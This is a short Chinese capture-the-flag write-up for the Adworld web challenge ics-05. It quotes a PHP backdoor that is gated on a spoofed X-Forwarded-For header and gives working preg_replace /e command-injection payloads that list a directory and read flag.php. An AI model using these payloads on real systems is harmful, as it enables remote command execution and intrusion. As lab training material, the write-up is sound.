攻防世界Web

2019年10月30日 258 字 大概 1 分钟 Writeup

攻防世界Web进阶部分Writeup

ics-05

hint：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统
所以直接进入设备维护中心，然后再点一下“云平台设备维护中心”，就可以发现有一个page参数，直接php伪协议读index.php，可以读到源码,其中关键部分：

//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
if($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1'){
    echo "<br >Welcome My Admin ! <br >";
    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];
    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }
}

这里就比较明显了，就是用三个参数构造后门，这里考的是preg_replace的命令执行漏洞，payload?pat=/test/e&rep=system("ls")&sub=jutst%20test
然后可以构造?pat=/test/e&rep=system("cd%20s3chahahaDir%26%26cd%20flag%26%26cat%20flag.php")&sub=jutst%20test读到flag
